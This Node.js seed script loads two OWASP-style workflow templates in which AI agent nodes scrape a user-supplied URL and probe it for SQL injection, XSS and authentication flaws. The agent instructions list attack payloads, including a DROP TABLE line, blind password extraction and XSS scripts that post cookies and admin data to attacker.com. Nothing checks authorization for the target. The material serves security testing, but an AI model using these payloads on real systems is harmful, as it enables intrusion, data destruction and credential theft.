#!/usr/bin/env node

/**
 * Seed All Security Templates Script
 * 
 * This script seeds all security templates from the static templates.ts file
 */

const { execSync } = require('child_process');
const fs = require('fs');

async function seedAllSecurityTemplates() {
  console.log('🔧 Seeding all security templates...\n');
  
  try {
    // Check current state
    console.log('1. Checking current database state...');
    const templatesResponse = execSync('curl -s http://localhost:3000/api/database/templates', { encoding: 'utf8' });
    const templates = JSON.parse(templatesResponse);
    console.log(`   📋 Current templates: ${templates.length}`);
    
    const securityTemplates = templates.filter(t => t.category === 'Security');
    console.log(`   🔒 Security templates: ${securityTemplates.length}`);
    
    if (securityTemplates.length > 0) {
      console.log('   ✅ Security templates found:');
      securityTemplates.forEach(t => {
        console.log(`      - ${t.name} (${t.customId})`);
      });
    }
    
    // Define all security templates from the static file
    const allSecurityTemplates = [
      {
        customId: 'sql-injection-xss-tester',
        name: 'SQL Injection & XSS Tester',
        description: 'Specialized testing for A03 Injection vulnerabilities (SQL, XSS, Command Injection)',
        category: 'Security',
        tags: ['security', 'injection', 'sql', 'xss', 'owasp-a03'],
        difficulty: 'intermediate',
        estimatedTime: '4-6 minutes',
        nodes: [
          {
            id: 'start',
            type: 'start',
            position: { x: 100, y: 300 },
            data: {
              nodeType: 'start',
              label: 'Start',
              nodeName: 'Start',
              inputVariables: [
                {
                  name: 'targetUrl',
                  type: 'string',
                  required: true,
                  description: 'Target URL with forms to test (e.g., https://example.com/login)',
                  defaultValue: 'https://example.com/login'
                },
                {
                  name: 'testPayloads',
                  type: 'string',
                  required: false,
                  description: 'Custom test payloads (optional)',
                  defaultValue: ''
                }
              ]
            }
          },
          {
            id: 'note-overview',
            type: 'note',
            position: { x: 100, y: 80 },
            data: {
              nodeType: 'note',
              label: 'Injection Testing Overview',
              noteText: 'SQL Injection & XSS Tester\n\nSpecialized for OWASP A03 - Injection:\n• SQL Injection testing\n• Cross-Site Scripting (XSS)\n• Command Injection\n• LDAP Injection\n• NoSQL Injection\n\nAdvanced payload testing!'
            }
          },
          {
            id: 'analyze-forms',
            type: 'agent',
            position: { x: 350, y: 300 },
            data: {
              nodeType: 'agent',
              label: 'Analyze Forms & Inputs',
              nodeName: 'Analyze Forms & Inputs',
              instructions: 'Analyze the target URL for injection points: {{input.targetUrl}}\n\n1. Use firecrawl_scrape to examine the target page\n2. Identify all input fields:\n   - Login forms\n   - Search boxes\n   - Contact forms\n   - API endpoints\n   - URL parameters\n   - HTTP headers\n\n3. Analyze each input for:\n   - Input validation mechanisms\n   - Error handling\n   - Response patterns\n   - Technology stack indicators\n\n4. Look for:\n   - Database error messages\n   - Framework-specific patterns\n   - Input sanitization\n   - CSRF tokens\n   - Content-Type headers\n\nReturn a detailed analysis of all potential injection points.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text',
              mcpTools: [
                {
                  name: 'Firecrawl',
                  url: 'https://mcp.firecrawl.dev/{FIRECRAWL_API_KEY}/v2/mcp',
                  authType: 'url',
                  label: 'Firecrawl'
                }
              ]
            }
          },
          {
            id: 'sql-injection-test',
            type: 'agent',
            position: { x: 600, y: 200 },
            data: {
              nodeType: 'agent',
              label: 'SQL Injection Testing',
              nodeName: 'SQL Injection Testing',
              instructions: 'Perform comprehensive SQL injection testing:\n\nTarget: {{input.targetUrl}}\nForms Analysis: {{lastOutput}}\n\nTest payloads for SQL injection:\n\n**Basic SQL Injection:**\n- \' OR \'1\'=\'1\n- \' OR 1=1--\n- \' UNION SELECT NULL--\n- \'; DROP TABLE users--\n\n**Blind SQL Injection:**\n- \' AND (SELECT COUNT(*) FROM users) > 0--\n- \' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=\'admin\') = \'a\'--\n\n**Time-based SQL Injection:**\n- \'; WAITFOR DELAY \'00:00:05\'--\n- \' AND (SELECT SLEEP(5))--\n\n**Error-based SQL Injection:**\n- \' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n\n**NoSQL Injection:**\n- {"$ne": null}\n- {"$gt": ""}\n- {"$where": "this.password.match(/.*/)}\n\nTest each identified input field and analyze responses for:\n- Database error messages\n- Response time differences\n- Content length changes\n- HTTP status code variations\n\nReturn detailed findings with proof of concept.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text'
            }
          },
          {
            id: 'xss-test',
            type: 'agent',
            position: { x: 600, y: 400 },
            data: {
              nodeType: 'agent',
              label: 'XSS Testing',
              nodeName: 'Cross-Site Scripting Testing',
              instructions: 'Perform comprehensive XSS testing:\n\nTarget: {{input.targetUrl}}\nForms Analysis: {{state.variables[\'analyze-forms\']}}\n\nTest payloads for XSS:\n\n**Basic XSS:**\n- <script>alert(\'XSS\')</script>\n- <img src=x onerror=alert(\'XSS\')>\n- <svg onload=alert(\'XSS\')>\n\n**Filter Bypass XSS:**\n- <ScRiPt>alert(\'XSS\')</ScRiPt>\n- <script>alert(String.fromCharCode(88,83,83))</script>\n- <iframe src="javascript:alert(\'XSS\')">\n\n**DOM-based XSS:**\n- #<script>alert(\'XSS\')</script>\n- ?search=<script>alert(\'XSS\')</script>\n\n**Stored XSS:**\n- Test in comment fields, user profiles, etc.\n- <script>document.location=\'http://attacker.com/steal.php?cookie=\'+document.cookie</script>\n\n**Reflected XSS:**\n- Test URL parameters, form inputs\n- <script>alert(document.cookie)</script>\n\n**Advanced XSS:**\n- <script>fetch(\'/admin/users\').then(r=>r.text()).then(d=>fetch(\'http://attacker.com/steal\',{method:\'POST\',body:d}))</script>\n\nTest each input field and analyze:\n- Input reflection in responses\n- Script execution\n- Filter bypass techniques\n- Context-aware payloads\n\nReturn detailed findings with working payloads.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text'
            }
          },
          {
            id: 'generate-injection-report',
            type: 'agent',
            position: { x: 850, y: 300 },
            data: {
              nodeType: 'agent',
              label: 'Generate Injection Report',
              nodeName: 'Generate Injection Report',
              instructions: 'Create a detailed injection vulnerability report:\n\nTarget: {{input.targetUrl}}\nForms Analysis: {{state.variables[\'analyze-forms\']}}\nSQL Injection Results: {{state.variables[\'sql-injection-test\']}}\nXSS Results: {{state.variables[\'xss-test\']}}\n\nFormat as:\n\n# Injection Vulnerability Assessment\n## Target: {{input.targetUrl}}\n## Assessment Date: [Current Date]\n\n## Executive Summary\n[Overall injection vulnerability status]\n\n## SQL Injection Findings\n### Critical SQL Injection\n[List critical SQL injection vulnerabilities with proof of concept]\n\n### High Risk SQL Injection\n[List high-risk SQL injection vulnerabilities]\n\n### Medium Risk SQL Injection\n[List medium-risk SQL injection vulnerabilities]\n\n## XSS Findings\n### Critical XSS\n[List critical XSS vulnerabilities with proof of concept]\n\n### High Risk XSS\n[List high-risk XSS vulnerabilities]\n\n### Medium Risk XSS\n[List medium-risk XSS vulnerabilities]\n\n## Command Injection Findings\n[List any command injection vulnerabilities found]\n\n## Remediation Recommendations\n[Prioritized fixes for each vulnerability type]\n\n## Testing Methodology\n[Document the testing approach used]\n\nMake it actionable for developers and security teams.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text'
            }
          },
          {
            id: 'end',
            type: 'end',
            position: { x: 1100, y: 300 },
            data: {
              nodeType: 'end',
              label: 'End',
              nodeName: 'End'
            }
          }
        ],
        edges: [
          { id: 'e1', source: 'start', target: 'analyze-forms' },
          { id: 'e2', source: 'analyze-forms', target: 'sql-injection-test' },
          { id: 'e3', source: 'analyze-forms', target: 'xss-test' },
          { id: 'e4', source: 'sql-injection-test', target: 'generate-injection-report' },
          { id: 'e5', source: 'xss-test', target: 'generate-injection-report' },
          { id: 'e6', source: 'generate-injection-report', target: 'end' }
        ]
      },
      {
        customId: 'auth-access-control-tester',
        name: 'Authentication & Access Control Tester',
        description: 'Specialized testing for A01 Broken Access Control and A07 Authentication Failures',
        category: 'Security',
        tags: ['security', 'authentication', 'access-control', 'owasp-a01', 'owasp-a07'],
        difficulty: 'intermediate',
        estimatedTime: '4-6 minutes',
        nodes: [
          {
            id: 'start',
            type: 'start',
            position: { x: 100, y: 300 },
            data: {
              nodeType: 'start',
              label: 'Start',
              nodeName: 'Start',
              inputVariables: [
                {
                  name: 'targetUrl',
                  type: 'string',
                  required: true,
                  description: 'Target URL to test (e.g., https://example.com)',
                  defaultValue: 'https://example.com'
                },
                {
                  name: 'testCredentials',
                  type: 'string',
                  required: false,
                  description: 'Test credentials (username:password format)',
                  defaultValue: ''
                }
              ]
            }
          },
          {
            id: 'note-overview',
            type: 'note',
            position: { x: 100, y: 80 },
            data: {
              nodeType: 'note',
              label: 'Auth & Access Control Testing',
              noteText: 'Authentication & Access Control Tester\n\nTests OWASP A01 & A07:\n• Broken Access Control\n• Authentication Failures\n• Session Management\n• Privilege Escalation\n• Direct Object References\n\nComprehensive auth testing!'
            }
          },
          {
            id: 'discover-auth-endpoints',
            type: 'agent',
            position: { x: 350, y: 300 },
            data: {
              nodeType: 'agent',
              label: 'Discover Auth Endpoints',
              nodeName: 'Discover Authentication Endpoints',
              instructions: 'Discover authentication and access control mechanisms:\n\nTarget: {{input.targetUrl}}\n\n1. Use firecrawl_scrape to analyze the target\n2. Identify authentication mechanisms:\n   - Login forms\n   - Registration forms\n   - Password reset functionality\n   - Multi-factor authentication\n   - OAuth/SSO integration\n   - API authentication\n\n3. Look for access control indicators:\n   - Admin panels\n   - User dashboards\n   - Protected resources\n   - Role-based access\n   - API endpoints with auth\n\n4. Analyze for:\n   - Session management\n   - Cookie security\n   - CSRF protection\n   - Rate limiting\n   - Account lockout policies\n\nReturn detailed analysis of authentication and access control mechanisms.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text',
              mcpTools: [
                {
                  name: 'Firecrawl',
                  url: 'https://mcp.firecrawl.dev/{FIRECRAWL_API_KEY}/v2/mcp',
                  authType: 'url',
                  label: 'Firecrawl'
                }
              ]
            }
          },
          {
            id: 'test-authentication',
            type: 'agent',
            position: { x: 600, y: 200 },
            data: {
              nodeType: 'agent',
              label: 'Test Authentication',
              nodeName: 'Test Authentication Mechanisms',
              instructions: 'Test authentication mechanisms for vulnerabilities:\n\nTarget: {{input.targetUrl}}\nAuth Endpoints: {{lastOutput}}\n\nTest for authentication failures:\n\n**Weak Password Policies:**\n- Test common passwords: admin, password, 123456\n- Test short passwords\n- Test passwords without complexity requirements\n\n**Account Enumeration:**\n- Test for username enumeration\n- Test for email enumeration\n- Test for timing attacks\n\n**Brute Force Protection:**\n- Test rate limiting\n- Test account lockout\n- Test CAPTCHA implementation\n\n**Session Management:**\n- Test session fixation\n- Test session hijacking\n- Test session timeout\n- Test concurrent sessions\n\n**Multi-Factor Authentication:**\n- Test MFA bypass\n- Test MFA brute force\n- Test backup codes\n\n**Password Reset:**\n- Test password reset enumeration\n- Test password reset token security\n- Test password reset bypass\n\n**OAuth/SSO Issues:**\n- Test for OAuth misconfigurations\n- Test for SSO bypass\n- Test for token leakage\n\nReturn detailed findings with proof of concept.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text'
            }
          },
          {
            id: 'test-access-control',
            type: 'agent',
            position: { x: 600, y: 400 },
            data: {
              nodeType: 'agent',
              label: 'Test Access Control',
              nodeName: 'Test Access Control Mechanisms',
              instructions: 'Test access control mechanisms for vulnerabilities:\n\nTarget: {{input.targetUrl}}\nAuth Endpoints: {{state.variables[\'discover-auth-endpoints\']}}\n\nTest for broken access control:\n\n**Horizontal Privilege Escalation:**\n- Test user-to-user access\n- Test data access between users\n- Test profile manipulation\n\n**Vertical Privilege Escalation:**\n- Test user-to-admin access\n- Test role escalation\n- Test permission bypass\n\n**Direct Object References:**\n- Test IDOR (Insecure Direct Object References)\n- Test parameter manipulation\n- Test file access\n\n**Function Level Access Control:**\n- Test API endpoint access\n- Test administrative functions\n- Test business logic bypass\n\n**Path Traversal:**\n- Test directory traversal\n- Test file inclusion\n- Test path manipulation\n\n**CORS Misconfigurations:**\n- Test cross-origin requests\n- Test credential inclusion\n- Test wildcard origins\n\n**API Security:**\n- Test API authentication\n- Test API authorization\n- Test API rate limiting\n\nReturn detailed findings with proof of concept.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text'
            }
          },
          {
            id: 'generate-auth-report',
            type: 'agent',
            position: { x: 850, y: 300 },
            data: {
              nodeType: 'agent',
              label: 'Generate Auth Report',
              nodeName: 'Generate Authentication Report',
              instructions: 'Create a comprehensive authentication and access control report:\n\nTarget: {{input.targetUrl}}\nAuth Endpoints: {{state.variables[\'discover-auth-endpoints\']}}\nAuth Testing: {{state.variables[\'test-authentication\']}}\nAccess Control Testing: {{state.variables[\'test-access-control\']}}\n\nFormat as:\n\n# Authentication & Access Control Assessment\n## Target: {{input.targetUrl}}\n## Assessment Date: [Current Date]\n\n## Executive Summary\n[Overall authentication and access control security posture]\n\n## Authentication Vulnerabilities\n### Critical Authentication Issues\n[List critical authentication vulnerabilities]\n\n### High Risk Authentication Issues\n[List high-risk authentication vulnerabilities]\n\n### Medium Risk Authentication Issues\n[List medium-risk authentication vulnerabilities]\n\n## Access Control Vulnerabilities\n### Critical Access Control Issues\n[List critical access control vulnerabilities]\n\n### High Risk Access Control Issues\n[List high-risk access control vulnerabilities]\n\n### Medium Risk Access Control Issues\n[List medium-risk access control vulnerabilities]\n\n## Privilege Escalation Findings\n[List any privilege escalation vulnerabilities found]\n\n## Session Management Issues\n[List session management vulnerabilities]\n\n## Recommendations\n[Prioritized remediation steps for authentication and access control]\n\n## Security Best Practices\n[Recommended security controls to implement]\n\nMake it actionable for security teams and developers.',
              model: 'anthropic/claude-sonnet-4-5-20250929',
              outputFormat: 'Text'
            }
          },
          {
            id: 'end',
            type: 'end',
            position: { x: 1100, y: 300 },
            data: {
              nodeType: 'end',
              label: 'End',
              nodeName: 'End'
            }
          }
        ],
        edges: [
          { id: 'e1', source: 'start', target: 'discover-auth-endpoints' },
          { id: 'e2', source: 'discover-auth-endpoints', target: 'test-authentication' },
          { id: 'e3', source: 'discover-auth-endpoints', target: 'test-access-control' },
          { id: 'e4', source: 'test-authentication', target: 'generate-auth-report' },
          { id: 'e5', source: 'test-access-control', target: 'generate-auth-report' },
          { id: 'e6', source: 'generate-auth-report', target: 'end' }
        ]
      }
    ];
    
    console.log(`\n2. Seeding ${allSecurityTemplates.length} additional security templates...`);
    
    let successCount = 0;
    let errorCount = 0;
    
    for (const template of allSecurityTemplates) {
      try {
        console.log(`   🔧 Inserting ${template.name}...`);
        
        // Write template to temp file
        const tempFile = `/tmp/security_template_${template.customId}.json`;
        fs.writeFileSync(tempFile, JSON.stringify(template, null, 2));
        
        // Insert template
        const insertResponse = execSync(`curl -s -X POST http://localhost:3000/api/database/templates/insert -H "Content-Type: application/json" -d @${tempFile}`, { encoding: 'utf8' });
        
        // Check if successful
        if (insertResponse.includes('success') || insertResponse.includes('id')) {
          console.log(`   ✅ Successfully inserted ${template.name}`);
          successCount++;
        } else {
          console.log(`   ❌ Failed to insert ${template.name}: ${insertResponse}`);
          errorCount++;
        }
        
        // Clean up temp file
        try {
          fs.unlinkSync(tempFile);
        } catch (e) {
          // Ignore cleanup errors
        }
        
      } catch (error) {
        console.log(`   ❌ Error inserting ${template.name}: ${error.message}`);
        errorCount++;
      }
    }
    
    // Final verification
    console.log('\n3. Final verification...');
    const templatesResponse2 = execSync('curl -s http://localhost:3000/api/database/templates', { encoding: 'utf8' });
    const templates2 = JSON.parse(templatesResponse2);
    console.log(`   📋 Total templates: ${templates2.length}`);
    
    const securityTemplates2 = templates2.filter(t => t.category === 'Security');
    console.log(`   🔒 Security templates: ${securityTemplates2.length}`);
    
    if (securityTemplates2.length > 0) {
      console.log('   ✅ Security templates found:');
      securityTemplates2.forEach(t => {
        console.log(`      - ${t.name} (${t.customId})`);
      });
    }
    
    console.log(`\n📊 Seeding Summary:`);
    console.log(`   ✅ Successful: ${successCount}`);
    console.log(`   ❌ Failed: ${errorCount}`);
    
    return securityTemplates2.length > 0;
    
  } catch (error) {
    console.error('❌ Seeding failed:', error.message);
    return false;
  }
}

// Run the seeding
if (require.main === module) {
  seedAllSecurityTemplates()
    .then(success => {
      console.log(success ? '\n🎉 All security templates seeded successfully!' : '\n❌ Failed to seed all security templates');
      process.exit(success ? 0 : 1);
    })
    .catch(error => {
      console.error('❌ Seeding failed:', error);
      process.exit(1);
    });
}

module.exports = { seedAllSecurityTemplates };
